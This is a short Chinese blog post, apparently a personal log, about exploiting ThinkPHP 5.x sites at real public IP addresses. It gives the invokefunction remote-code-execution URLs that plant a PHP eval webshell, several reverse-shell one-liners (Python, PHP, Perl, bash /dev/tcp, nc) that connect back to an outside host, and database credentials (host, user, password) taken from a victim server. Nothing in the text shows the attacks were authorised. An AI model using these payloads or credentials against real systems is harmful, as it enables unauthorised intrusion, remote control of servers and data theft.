---
title: tp5.x渗透测试
date: 2018-12-11 19:51:59
tags:
---

## 142.93.198.170

1. 写入shell

   ```
   http://142.93.198.170/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%20%3E%20./uploads/20180403/error.php
   ```

2. 上菜刀

3. 为了方便敲命令，反弹shell

   ```
   python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('23.106.159.30',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
   ```

   ```
   php -r '$sock=fsockopen("23.106.159.30",80);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```

   ```
   perl -e 'use Socket;$i="23.106.159.30";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```

   ```
   /bin/bash -i >& /dev/tcp/23.106.159.30/80 0>&1
   ```

   试了好几个，就一个成功:

   ```
   nc -e /bin/bash 23.106.159.30 80
   ```

## 39.106.169.194:8080

## 171.8.71.241:8080

`http://171.8.71.241:8080/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-l`

1. 写入shell

```
echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%20%3E%20./uploads/admin/avatar/error.php
```

2. 反弹shell

3. 查看database.php

```
rm-2zetn5e59u3ems15qo.mysql.rds.aliyuncs.com
yituwang
nfP46o89r4lD
```

```
/bin/bash -i >& /dev/tcp/142.93.198.170/8900 0>&1 
```

